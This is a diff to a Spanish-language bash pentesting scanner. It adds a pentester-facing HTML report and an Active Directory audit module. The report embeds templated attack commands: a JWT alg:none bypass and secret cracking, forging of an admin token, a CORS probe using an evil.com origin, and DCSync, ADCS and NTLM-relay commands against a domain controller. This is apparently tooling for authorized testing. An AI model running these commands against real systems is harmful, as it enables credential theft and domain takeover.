+    [[ "$INTEL_JWT_ALG_NONE" == "true" || -n "$INTEL_JWT_WEAK_SECRET" ]] && manual_tips+="
+    <div class='tip'>
+      <div class='tip-title'>🔑 JWT — Técnicas Avanzadas</div>
+      <code>jwt_tool TOKEN -X a  # alg:none bypass</code>
+      <code>jwt_tool TOKEN -C -d /usr/share/wordlists/rockyou.txt  # crack secret</code>
+      <code>python3 -c \"import jwt; print(jwt.encode({'role':'admin','exp':9999999999},'${INTEL_JWT_WEAK_SECRET:-secret}',algorithm='HS256'))\"</code>
+    </div>"
+
+    [[ "$INTEL_CORS_VULN" == "true" ]] && manual_tips+="
+    <div class='tip'>
+      <div class='tip-title'>🌐 CORS → Robo de Datos</div>
+      <code>curl -k -H 'Origin: https://evil.com' '${ORIGINAL_URL:-TARGET}/api/profile' -v 2>&1 | grep -i 'access-control'</code>
+      <div>PoC HTML generado en: <b>${OUTPUT_DIR}/web/cors_poc.html</b></div>
+    </div>"
+
+    # AD tips adicionales
+    [[ -n "$AD_DC_IP" ]] && manual_tips+="
+    <div class='tip'>
+      <div class='tip-title'>🏢 Active Directory — Próximos Pasos</div>
+      <code>bloodhound-python -u ${AD_USER} -p '${AD_PASS}' -d ${AD_DOMAIN_FQDN} -ns ${AD_DC_IP} -c All --zip</code>
+      <code>impacket-secretsdump ${AD_DOMAIN_FQDN}/${AD_USER}@${AD_DC_IP} -just-dc-ntlm  # DCSync si DA</code>
+      <code>certipy find -u ${AD_USER}@${AD_DOMAIN_FQDN} -p '${AD_PASS}' -dc-ip ${AD_DC_IP} -vulnerable -stdout</code>
+      <code>impacket-ntlmrelayx -smb2support -t ldaps://${AD_DC_IP} --add-computer  # NTLM Relay si SMB signing off</code>
+    </div>"
+
+    # Payloads efectivos documentados
+    local confirmed_payload_html=""
+    if (( ${#EFFECTIVE_PAYLOADS[@]} > 0 )); then
+        confirmed_payload_html="<table class='payload-log'>"
+        confirmed_payload_html+="<thead><tr><th>Tipo</th><th>Payload Efectivo</th><th>URL / Parámetro</th><th>Evidencia</th></tr></thead><tbody>"
+        for ep in "${EFFECTIVE_PAYLOADS[@]}"; do
+            local ep_tipo ep_payload ep_url ep_ev
+            ep_tipo=$(echo "$ep"    | awk -F'|||' '{print $1}')
+            ep_payload=$(echo "$ep" | awk -F'|||' '{print $2}')
+            ep_url=$(echo "$ep"     | awk -F'|||' '{print $3}')
+            ep_ev=$(echo "$ep"      | awk -F'|||' '{print $4}')
+            confirmed_payload_html+="<tr>"
+            confirmed_payload_html+="<td><span class='type-tag'>${ep_tipo}</span></td>"
+            confirmed_payload_html+="<td><code class='p-code'>${ep_payload}</code></td>"
+            confirmed_payload_html+="<td><code class='url-code'>${ep_url}</code></td>"
+            confirmed_payload_html+="<td style='font-size:12px;'>${ep_ev}</td>"
+            confirmed_payload_html+="</tr>"
+        done
+        confirmed_payload_html+="</tbody></table>"
+    else
+        confirmed_payload_html="<p style='color:#6b7280;font-size:13px;'>Sin payloads confirmados registrados — revisar hallazgos individuales para evidencia.</p>"
+    fi
+
+    cat > "$REPORT_PENTESTER" << PTHTML
+<!DOCTYPE html><html lang="es"><head>
+<meta charset="UTF-8">
+<title>Reporte Pentester — ${TARGET}</title>
+<style>
+  :root{--bg:#0d1117;--bg2:#161b22;--bg3:#21262d;--txt:#c9d1d9;--txt2:#8b949e;
+        --border:#30363d;--accent:#58a6ff;--red:#ff2d2d;--orange:#ff6b35;
+        --yellow:#ffd23f;--green:#3fb950;--purple:#bc8cff;}
+  *{box-sizing:border-box;margin:0;padding:0;}
+  body{font-family:'Cascadia Code','Fira Code','JetBrains Mono',monospace;
+       background:var(--bg);color:var(--txt);line-height:1.6;font-size:14px;}
+  ::selection{background:#388bfd33;}
+  .header{background:linear-gradient(180deg,#1c2128 0%,var(--bg) 100%);
+          padding:32px 48px;border-bottom:1px solid var(--border);}
+  .header-top{display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:16px;}
+  .header-badge{font-size:10px;letter-spacing:2px;text-transform:uppercase;
+                color:var(--red);border:1px solid var(--red);padding:3px 10px;
+                border-radius:4px;margin-bottom:12px;display:inline-block;}
+  .header h1{font-size:22px;font-weight:700;color:#fff;margin-bottom:4px;}
+  .header-meta{font-size:12px;color:var(--txt2);}
+  .header-meta span{margin-right:20px;}
+  .header-meta b{color:var(--accent);}
+  .container{max-width:1200px;margin:0 auto;padding:28px 48px;}
+  /* INTEL BOX */
+  .intel-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:8px;margin-top:12px;}
+  .intel-item{background:var(--bg2);border:1px solid var(--border);border-radius:6px;
+              padding:10px 14px;font-size:12px;}
+  .intel-label{color:var(--txt2);font-size:10px;text-transform:uppercase;
+               letter-spacing:1px;display:block;margin-bottom:2px;}
+  .intel-val{color:var(--accent);font-weight:600;}
+  /* Sección */
+  .section{background:var(--bg2);border:1px solid var(--border);border-radius:8px;
+           padding:24px;margin-bottom:20px;}
+  .section-title{font-size:15px;font-weight:700;color:#fff;margin-bottom:14px;
+                 padding-bottom:10px;border-bottom:1px solid var(--border);
+                 display:flex;align-items:center;gap:8px;}
+  /* Attack Chains */
+  .chain{border:1px solid var(--border);border-radius:8px;margin-bottom:14px;overflow:hidden;}
+  .chain.critical{border-color:#ff2d2d55;}
+  .chain-header{background:linear-gradient(90deg,#ff2d2d22,transparent);
+                color:var(--red);font-weight:700;padding:12px 16px;
+                font-size:13px;border-bottom:1px solid #ff2d2d33;}
+  .chain-steps{padding:12px 16px;display:flex;flex-direction:column;gap:10px;}
+  .step{display:flex;gap:12px;align-items:flex-start;}
+  .step-num{background:var(--accent);color:#000;width:22px;height:22px;border-radius:50%;
+            display:flex;align-items:center;justify-content:center;font-size:11px;
+            font-weight:800;flex-shrink:0;margin-top:1px;}
+  .step-body{flex:1;font-size:12px;}
+  .step-body b{display:block;color:var(--txt);margin-bottom:4px;}
+  /* Código */
+  code{display:block;background:var(--bg);border:1px solid var(--border);
+       border-radius:4px;padding:6px 12px;margin:4px 0;font-size:12px;
+       color:var(--green);word-break:break-all;white-space:pre-wrap;}
+  /* Hallazgos */
+  .sev-group{margin-bottom:16px;}
+  .sev-group-header{font-size:11px;font-weight:700;text-transform:uppercase;
+                    letter-spacing:1.5px;padding:6px 12px;border-radius:4px;
+                    margin-bottom:10px;display:inline-block;}
+  .sev-group-header.sev-crítico{background:#ff2d2d22;color:var(--red);border:1px solid #ff2d2d44;}
+  .sev-group-header.sev-alto{background:#ff6b3522;color:var(--orange);border:1px solid #ff6b3544;}
+  .sev-group-header.sev-medio{background:#ffd23f22;color:var(--yellow);border:1px solid #ffd23f44;}
+  .sev-group-header.sev-bajo{background:#3fb95022;color:var(--green);border:1px solid #3fb95044;}
+  .sev-group-header.sev-info{background:#58a6ff22;color:var(--accent);border:1px solid #58a6ff44;}
+  .finding{background:var(--bg);border-radius:6px;padding:14px 16px;
+           margin-bottom:10px;transition:border-left-color .2s;}
+  .f-title{display:flex;align-items:center;gap:8px;margin-bottom:8px;flex-wrap:wrap;}
+  .f-sev{font-size:10px;font-weight:700;color:#000;padding:2px 8px;
+         border-radius:3px;text-transform:uppercase;flex-shrink:0;}
+  .f-name{font-size:13px;font-weight:600;color:#fff;flex:1;}
+  .cvss-tag{font-size:10px;font-weight:700;padding:2px 7px;border-radius:3px;
+            border:1px solid;flex-shrink:0;}
+  .f-detail{font-size:12px;color:var(--txt2);margin-bottom:8px;
+            line-height:1.7;}
+  .f-detail code{color:var(--yellow);}
+  .f-rem{background:var(--bg2);border-radius:4px;padding:8px 12px;
+         font-size:12px;color:var(--txt2);margin-bottom:6px;}
+  .f-next{background:#0c1f0f;border:1px solid #3fb95033;border-radius:4px;
+          padding:8px 12px;font-size:12px;}
+  .f-next code{color:var(--green);background:transparent;border:none;padding:0;}
+  .label{font-size:10px;text-transform:uppercase;letter-spacing:1px;
+         color:var(--txt2);display:block;margin-bottom:4px;}
+  /* Tips */
+  .tip{background:var(--bg);border:1px solid var(--border);border-radius:6px;
+       padding:14px 16px;margin-bottom:12px;}
+  .tip-title{font-size:13px;font-weight:700;color:#fff;margin-bottom:8px;}
+  /* Payloads confirmados */
+  .payload-log{width:100%;border-collapse:collapse;font-size:12px;}
+  .payload-log th{background:var(--bg3);color:var(--txt2);padding:8px 12px;
+                  text-align:left;font-size:10px;text-transform:uppercase;letter-spacing:1px;}
+  .payload-log td{padding:8px 12px;border-bottom:1px solid var(--border);vertical-align:top;}
+  .payload-log tr:last-child td{border-bottom:none;}
+  .type-tag{background:var(--bg3);border:1px solid var(--border);padding:2px 8px;
+            border-radius:3px;font-size:10px;text-transform:uppercase;color:var(--accent);}
+  .p-code{color:var(--red);background:transparent;border:none;padding:0;
+          font-size:11px;word-break:break-all;}
+  .url-code{color:var(--yellow);background:transparent;border:none;padding:0;
+            font-size:11px;word-break:break-all;}
+  /* Stats */
+  .stats-row{display:flex;gap:10px;margin-bottom:20px;flex-wrap:wrap;}
+  .stat{background:var(--bg2);border:1px solid var(--border);border-radius:6px;
+        padding:14px 18px;text-align:center;min-width:90px;}
+  .stat-n{font-size:26px;font-weight:800;}
+  .stat-l{font-size:10px;color:var(--txt2);text-transform:uppercase;margin-top:3px;}
+  /* Scrollbar */
+  ::-webkit-scrollbar{width:6px;height:6px;}
+  ::-webkit-scrollbar-track{background:var(--bg2);}
+  ::-webkit-scrollbar-thumb{background:var(--border);border-radius:3px;}
+  ::-webkit-scrollbar-thumb:hover{background:#444c56;}
+</style>
+</head><body>
+
+<div class="header">
+  <div class="header-badge">⚡ CONFIDENCIAL — USO INTERNO — PENTESTER</div>
+  <h1>🔍 Reporte Técnico Completo — ${TARGET}</h1>
+  <div class="header-meta">
+    <span>📅 <b>$(date '+%d/%m/%Y %H:%M')</b></span>
+    <span>🎯 Target: <b>${TARGET}</b></span>
+    <span>🔧 Modo: <b>${SCAN_MODE}</b></span>
+    <span>📊 Módulos: <b>45</b></span>
+    <span>🗂️ Output: <b>${OUTPUT_DIR}/</b></span>
+  </div>
+</div>
+
+<div class="container">
+
+<!-- INTEL COMPLETO -->
+<div class="section">
+  <div class="section-title">🧠 INTEL — Contexto Técnico Completo</div>
+  <div class="intel-grid">
+    $([ -n "$INTEL_OS" ]                && echo "<div class='intel-item'><span class='intel-label'>OS</span><span class='intel-val'>${INTEL_OS}</span></div>")
+    $([ -n "$INTEL_CMS" ]               && echo "<div class='intel-item'><span class='intel-label'>CMS</span><span class='intel-val'>${INTEL_CMS}</span></div>")
+    $([ -n "$INTEL_FRAMEWORK_BACKEND" ] && echo "<div class='intel-item'><span class='intel-label'>Backend</span><span class='intel-val'>${INTEL_FRAMEWORK_BACKEND}</span></div>")
+    $([ -n "$INTEL_FRAMEWORK_JS" ]      && echo "<div class='intel-item'><span class='intel-label'>Frontend JS</span><span class='intel-val'>${INTEL_FRAMEWORK_JS}</span></div>")
+    $([ -n "$INTEL_WAF_NAME" ]          && echo "<div class='intel-item'><span class='intel-label'>WAF</span><span class='intel-val'>${INTEL_WAF_NAME}</span></div>")
+    $([ -n "$INTEL_GRAPHQL_URL" ]       && echo "<div class='intel-item'><span class='intel-label'>GraphQL URL</span><span class='intel-val'>${INTEL_GRAPHQL_URL}</span></div>")
+    $([ -n "$INTEL_SWAGGER_URL" ]       && echo "<div class='intel-item'><span class='intel-label'>Swagger URL</span><span class='intel-val'>${INTEL_SWAGGER_URL}</span></div>")
+    $([ -n "$INTEL_LFI_URL" ]           && echo "<div class='intel-item' style='border-color:var(--red)'><span class='intel-label'>LFI URL</span><span class='intel-val' style='color:var(--red)'>${INTEL_LFI_URL}</span></div>")
+    $([ -n "$INTEL_LFI_PARAM" ]         && echo "<div class='intel-item' style='border-color:var(--red)'><span class='intel-label'>LFI Param</span><span class='intel-val' style='color:var(--red)'>${INTEL_LFI_PARAM}</span></div>")
+    $([ -n "$INTEL_SSRF_URL" ]          && echo "<div class='intel-item' style='border-color:var(--red)'><span class='intel-label'>SSRF URL</span><span class='intel-val' style='color:var(--red)'>${INTEL_SSRF_URL}</span></div>")
+    $([ -n "$INTEL_CORS_ORIGIN" ]       && echo "<div class='intel-item' style='border-color:var(--orange)'><span class='intel-label'>CORS Origin</span><span class='intel-val' style='color:var(--orange)'>${INTEL_CORS_ORIGIN}</span></div>")
+    $([ -n "$INTEL_JWT_WEAK_SECRET" ]   && echo "<div class='intel-item' style='border-color:var(--red)'><span class='intel-label'>JWT Secret</span><span class='intel-val' style='color:var(--red)'>${INTEL_JWT_WEAK_SECRET}</span></div>")
+    $([ -n "$INTEL_CLOUD_PROVIDER" ]    && echo "<div class='intel-item'><span class='intel-label'>Cloud</span><span class='intel-val'>${INTEL_CLOUD_PROVIDER}</span></div>")
+    $([ "${#INTEL_TECHNOLOGIES[@]}" -gt 0 ]   && echo "<div class='intel-item'><span class='intel-label'>Stack</span><span class='intel-val'>${INTEL_TECHNOLOGIES[*]}</span></div>")
+    $([ "${#INTEL_INJECTABLE_URLS[@]}" -gt 0 ] && echo "<div class='intel-item'><span class='intel-label'>URLs inyectables</span><span class='intel-val'>${#INTEL_INJECTABLE_URLS[@]}</span></div>")
+    $([ "${#INTEL_API_ENDPOINTS[@]}" -gt 0 ]   && echo "<div class='intel-item'><span class='intel-label'>API Endpoints</span><span class='intel-val'>${#INTEL_API_ENDPOINTS[@]}</span></div>")
+    $([ "${#INTEL_JWT_TOKENS[@]}" -gt 0 ]      && echo "<div class='intel-item' style='border-color:var(--yellow)'><span class='intel-label'>JWT Tokens</span><span class='intel-val' style='color:var(--yellow)'>${#INTEL_JWT_TOKENS[@]} encontrados</span></div>")
+    $([ "${#AD_KERBEROASTABLE[@]}" -gt 0 ]     && echo "<div class='intel-item' style='border-color:var(--red)'><span class='intel-label'>Kerberoastable</span><span class='intel-val' style='color:var(--red)'>${#AD_KERBEROASTABLE[@]} SPNs</span></div>")
+    $([ "${#AD_ADCS_TEMPLATES[@]}" -gt 0 ]     && echo "<div class='intel-item' style='border-color:var(--red)'><span class='intel-label'>ADCS ESC</span><span class='intel-val' style='color:var(--red)'>${#AD_ADCS_TEMPLATES[@]} templates</span></div>")
+  </div>
+</div>
+
+<!-- STATS -->
+<div class="stats-row">
+$(local crit2=0 alto2=0 med2=0 baj2=0 inf2=0
+  for f in "${FINDINGS[@]}"; do
+    case $(echo "$f"|awk -F'|||' '{print $1}') in
+      CRÍTICO) ((crit2++)) ;; ALTO) ((alto2++)) ;;
+      MEDIO)   ((med2++))  ;; BAJO) ((baj2++)) ;; *) ((inf2++)) ;;
+    esac
+  done
+  echo "<div class='stat'><div class='stat-n' style='color:var(--red);'>${crit2}</div><div class='stat-l'>Críticos</div></div>"
+  echo "<div class='stat'><div class='stat-n' style='color:var(--orange);'>${alto2}</div><div class='stat-l'>Altos</div></div>"
+  echo "<div class='stat'><div class='stat-n' style='color:var(--yellow);'>${med2}</div><div class='stat-l'>Medios</div></div>"
+  echo "<div class='stat'><div class='stat-n' style='color:var(--green);'>${baj2}</div><div class='stat-l'>Bajos</div></div>"
+  echo "<div class='stat'><div class='stat-n' style='color:var(--accent);'>${inf2}</div><div class='stat-l'>Info</div></div>")
+</div>
+
+<!-- RUTAS DE ATAQUE ENCADENADAS -->
+$(if [[ -n "$attack_chains" ]]; then
+  echo "<div class='section'>"
+  echo "<div class='section-title'>⛓️ RUTAS DE ATAQUE ENCADENADAS</div>"
+  echo "<p style='font-size:12px;color:var(--txt2);margin-bottom:16px;'>Attack chains identificadas según el INTEL recolectado. Ejecutar en orden indicado.</p>"
+  echo "$attack_chains"
+  echo "</div>"
+fi)
+
+<!-- PAYLOADS EFECTIVOS -->
+<div class="section">
+  <div class="section-title">💣 PAYLOADS / TÉCNICAS CONFIRMADAS</div>
+  ${confirmed_payload_html}
+</div>
+
+<!-- URLs INYECTABLES -->
+$(if (( ${#INTEL_INJECTABLE_URLS[@]} > 0 )); then
+  echo "<div class='section'>"
+  echo "<div class='section-title'>🎯 URLs con Parámetros Inyectables</div>"
+  echo "<div style='font-size:12px;'>"
+  for u in "${INTEL_INJECTABLE_URLS[@]}"; do
+    echo "<code style='color:var(--yellow);'>$u</code>"
+  done
+  echo "</div></div>"
+fi)
+
+<!-- TODOS LOS HALLAZGOS TÉCNICOS -->
+<div class="section">
+  <div class="section-title">📋 TODOS LOS HALLAZGOS — DETALLE TÉCNICO COMPLETO</div>
+  ${all_findings_html}
+</div>
+
+<!-- TIPS DE EXPLORACIÓN MANUAL -->
+<div class="section">
+  <div class="section-title">🧭 TIPS PARA EXPLORACIÓN MANUAL</div>
+  <p style='font-size:12px;color:var(--txt2);margin-bottom:14px;'>
+    Basados en el stack detectado y los hallazgos. Rutas de profundización manual recomendadas.
+  </p>
+  ${manual_tips}
+  <div class='tip'>
+    <div class='tip-title'>📁 Archivos Generados para Análisis</div>
+    <code>ls -la ${OUTPUT_DIR}/</code>
+    <code>cat ${OUTPUT_DIR}/web/sqli_results.txt</code>
+    <code>cat ${OUTPUT_DIR}/web/js_analysis.txt  # Secrets en JS bundles</code>
+    <code>cat ${OUTPUT_DIR}/recon/nuclei_result.txt | grep -E 'critical|high'</code>
+    $([ -n "$AD_DC_IP" ] && echo "<code>ls -la ${OUTPUT_DIR}/active_directory/  # Dumps AD</code>")
+  </div>
+  <div class='tip'>
+    <div class='tip-title'>🔄 Comandos de Seguimiento Rápido</div>
+    <code>sudo ./wriestTavo.sh --show-cves  # Ver CVEs cacheados del stack</code>
+    <code>sudo ./wriestTavo.sh ${TARGET} --mode aggressive  # Re-scan agresivo</code>
+    <code>sudo ./wriestTavo.sh ${TARGET} --mode stealth    # Evasión de WAF/IDS</code>
+    <code>sudo searchsploit --update &amp;&amp; sudo ./wriestTavo.sh ${TARGET}  # Con BD actualizada</code>
+  </div>
+</div>
+
+</div>
+</body></html>
+PTHTML
+
+    ok "Reporte Pentester → ${REPORT_PENTESTER}"
+}
+
+# ════════════════════════════════════════════════════════════════
+# ORQUESTADOR — Genera los 3 reportes y muestra resumen final
+# ════════════════════════════════════════════════════════════════
+generar_tres_reportes() {
+    echo
+    log "Generando 3 tipos de reportes especializados..."
+    echo -e "  ${C_DIM}Esto puede tomar unos segundos...${C_RST}"
+    echo
+
+    generar_reporte_cliente
+    generar_reporte_censurado
+    generar_reporte_pentester
+
+    echo
+    echo -e "${C_PUR}  ╔═════════════════════════════════════════════════╗${C_RST}"
+    echo -e "${C_PUR}  ║         📊 REPORTES GENERADOS                   ║${C_RST}"
+    echo -e "${C_PUR}  ╚═════════════════════════════════════════════════╝${C_RST}"
+    echo
+    echo -e "  ${C_YEL}1. Cliente IT${C_RST}   → ${C_CYN}$(basename "$REPORT_CLIENT")${C_RST}"
+    echo -e "     ${C_DIM}Resumen ejecutivo + payloads aplicables + plan de acción${C_RST}"
+    echo
+    echo -e "  ${C_YEL}2. Censurado${C_RST}    → ${C_CYN}$(basename "$REPORT_CENSORED")${C_RST}"
+    echo -e "     ${C_DIM}IPs/URLs/tokens/comandos redactados — para terceros/compliance${C_RST}"
+    echo
+    echo -e "  ${C_YEL}3. Pentester${C_RST}    → ${C_CYN}$(basename "$REPORT_PENTESTER")${C_RST}"
+    echo -e "     ${C_DIM}Técnico completo + rutas de ataque encadenadas + tips${C_RST}"
+    echo
+    [[ -n "$REPORT_FILE" ]] && \
+        echo -e "  ${C_YEL}Original${C_RST}      → ${C_CYN}$(basename "$REPORT_FILE")${C_RST}"
+    echo
+}
+
+
 # ─── REPORTE HTML PROFESIONAL ────────────────────────────────────
 generar_reporte_html() {
     log "Generando Reporte HTML Profesional..."
@@ -5053,7 +8796,7 @@ menu_modulos() {
     echo -e "${C_BLU}║     Selecciona módulos a ejecutar    ║${C_RST}"
     echo -e "${C_BLU}╚══════════════════════════════════════╝${C_RST}"
     echo
-    echo -e "  ${C_GRN}[1]${C_RST} Full Scan v7.0 ${C_YEL}(44 módulos — stack moderno + exploit intel)${C_RST}"
+    echo -e "  ${C_GRN}[1]${C_RST} Full Scan v8.0 ${C_YEL}(45 módulos — stack moderno + AD + exploit intel)${C_RST}"
     echo -e "  ${C_GRN}[2]${C_RST} Recon OSINT  ${C_CYN}(crt.sh + theHarvester + dnsrecon + subdominios)${C_RST}"
     echo -e "  ${C_GRN}[3]${C_RST} Web + SSL     ${C_CYN}(WAF + nikto + nuclei + gobuster + sslscan + arjun)${C_RST}"
     echo -e "  ${C_GRN}[4]${C_RST} Bug Bounty Pro${C_CYN}(recon + framework + injection + CORS + JWT + SSRF)${C_RST}"
@@ -5083,7 +8826,7 @@ menu_modulos() {
         6)  modulo_waf; modulo_http_headers; modulo_whatweb; modulo_framework_scan
             modulo_endpoints; modulo_js_analysis; modulo_arjun; modulo_jwt; modulo_cors ;;
         7)  modulo_port_scan; modulo_version_scan; modulo_smb; modulo_cme; modulo_snmp
-            modulo_smtp_enum; modulo_http_methods; modulo_infra_exposure; modulo_iis_windows ;;
+            modulo_smtp_enum; modulo_http_methods; modulo_infra_exposure; modulo_iis_windows; modulo_adpulse ;;
         8)  modulo_whatweb; modulo_framework_scan; modulo_ssti; modulo_ssrf; modulo_lfi ;;
         9)  modulo_waf; modulo_http_headers; modulo_wpscan; modulo_nuclei; modulo_gobuster
             modulo_sqli; modulo_xss; modulo_dalfox ;;
@@ -5093,7 +8836,7 @@ menu_modulos() {
             modulo_sqli; modulo_sqlmap; modulo_nosqli; modulo_xss; modulo_dalfox
             modulo_commix; modulo_lfi; modulo_ssti; modulo_ssrf; modulo_cors
             modulo_jwt; modulo_http_methods; modulo_infra_exposure
-            modulo_smb; modulo_cme; modulo_vuln_scan; modulo_searchsploit ;;
+            modulo_smb; modulo_cme; modulo_adpulse; modulo_vuln_scan; modulo_searchsploit ;;
         11) menu_custom ;;
         *)  warn "Opción inválida. Ejecutando Full Scan."; run_full_scan ;;
     esac
@@ -5101,7 +8844,7 @@ menu_modulos() {
 
 menu_custom() {
     echo
-    echo -e "${C_YEL}Módulos v7.0 (38) — escribe números separados por espacio:${C_RST}"
+    echo -e "${C_YEL}Módulos v8.0 (38) — escribe números separados por espacio:${C_RST}"
     echo -e "  ${C_GRN} 1${C_RST}) TTL/OS          ${C_GRN} 2${C_RST}) Port Scan       ${C_GRN} 3${C_RST}) Version Scan"
     echo -e "  ${C_GRN} 4${C_RST}) WAF              ${C_GRN} 5${C_RST}) HTTP Headers    ${C_GRN} 6${C_RST}) WhatWeb"
     echo -e "  ${C_GRN} 7${C_RST}) Nikto            ${C_GRN} 8${C_RST}) Gobuster        ${C_GRN} 9${C_RST}) Subdominios"
@@ -5116,7 +8859,7 @@ menu_custom() {
     echo -e "  ${C_GRN}34${C_RST}) CORS Misconfig   ${C_GRN}35${C_RST}) JWT Analysis    ${C_GRN}36${C_RST}) NoSQLi"
     echo -e "  ${C_GRN}37${C_RST}) HTTP Methods     ${C_GRN}38${C_RST}) Docker/K8s/Infra"
     echo -e "  ${C_GRN}39${C_RST}) XXE              ${C_GRN}40${C_RST}) IDOR+OpenRedirect  ${C_GRN}41${C_RST}) IIS Windows"
-    echo -e "  ${C_GRN}43${C_RST}) EDB+NVD Intel    ${C_GRN}44${C_RST}) EDB Búsqueda"
+    echo -e "  ${C_GRN}43${C_RST}) EDB+NVD Intel    ${C_GRN}44${C_RST}) EDB Búsqueda      ${C_GRN}45${C_RST}) ADPulse Audit"
     echo
     echo -ne "${C_YEL}Selección: ${C_RST}"
     read -r seleccion
@@ -5138,13 +8881,14 @@ menu_custom() {
             37) modulo_http_methods ;;  38) modulo_infra_exposure ;;
             39) modulo_xxe ;;           40) modulo_idor_redirect ;;  41) modulo_iis_windows ;;
             43) modulo_edb_intel ;;    44) modulo_edb_search ;;
+            45) modulo_adpulse ;;   45) modulo_adpulse ;;
         esac
     done
 }
 
 run_full_scan() {
     log "════════════════════════════════════════"
-    log " WriestTavo v7.0 — Full Scan (44 módulos)"
+    log " WriestTavo v8.0 — Full Scan (44 módulos)"
     log "════════════════════════════════════════"
 
     # ── FASE 1: Reconocimiento pasivo (sin tocar el target)
@@ -5206,7 +8950,9 @@ run_full_scan() {
 
     # ── FASE 7: Post-scan y reporting
     log "── FASE 7: Post-Scan ───────────────────"
+    modulo_adpulse        # ADPulse — AD audit si puerto 389/636/445 abierto
     modulo_edb_intel      # Exploit-DB + NVD + GHSA cruzado con el stack
+    modulo_adpulse        # ADPulse — Active Directory (si puertos AD detectados)
     modulo_vuln_scan
     modulo_searchsploit
 }
@@ -5214,7 +8960,7 @@ run_full_scan() {
 # ─── HELP ───────────────────────────────────────────────────────
 show_help() {
     echo
-    echo -e "${C_BOLD}WriestTavo v7.0${C_RST} :: Pentesting & Bug Bounty Scanner (41 módulos)"
+    echo -e "${C_BOLD}WriestTavo v8.0${C_RST} :: Pentesting & Bug Bounty Scanner (41 módulos)"
     echo
     echo -e "Uso: sudo $0 [opciones] <IP | dominio>"
     echo
@@ -5249,7 +8995,7 @@ show_help() {
 
 # ─── HELPER: INSTALAR DEPENDENCIAS AUTOMÁTICAMENTE ──────────────
 _run_install() {
-    log "WriestTavo Installer — instalando herramientas v7.0"
+    log "WriestTavo Installer — instalando herramientas v8.0"
     echo
 
     # Core
@@ -5496,14 +9242,18 @@ main() {
     _report_stack_cves
 
     generar_reporte_html
+    generar_tres_reportes
 
     echo
     echo -e "${C_BLU}════════════════════════════════════════════${C_RST}"
     echo -e "  ${C_GRN}SCAN COMPLETO${C_RST}"
-    echo -e "  Reporte   : ${C_YEL}${REPORT_FILE}${C_RST}"
-    echo -e "  Archivos  : ${C_YEL}${OUTPUT_DIR}/${C_RST}"
-    echo -e "  Payloads+ : ${C_CYN}${CUSTOM_PAYLOADS}/${C_RST}"
-    echo -e "  Módulos+  : ${C_CYN}${CUSTOM_MODULES_DIR}/${C_RST}"
+    echo -e "  Reporte Original : ${C_YEL}${REPORT_FILE}${C_RST}"
+    echo -e "  Reporte Cliente  : ${C_YEL}${REPORT_CLIENT}${C_RST}"
+    echo -e "  Reporte Censurado: ${C_YEL}${REPORT_CENSORED}${C_RST}"
+    echo -e "  Reporte Pentester: ${C_YEL}${REPORT_PENTESTER}${C_RST}"
+    echo -e "  Archivos         : ${C_YEL}${OUTPUT_DIR}/${C_RST}"
+    echo -e "  Payloads+        : ${C_CYN}${CUSTOM_PAYLOADS}/${C_RST}"
+    echo -e "  Módulos+         : ${C_CYN}${CUSTOM_MODULES_DIR}/${C_RST}"
     echo -e "${C_BLU}════════════════════════════════════════════${C_RST}"
     echo -e "  Mantener  : ${C_DIM}sudo $0 --update${C_RST}"
 }
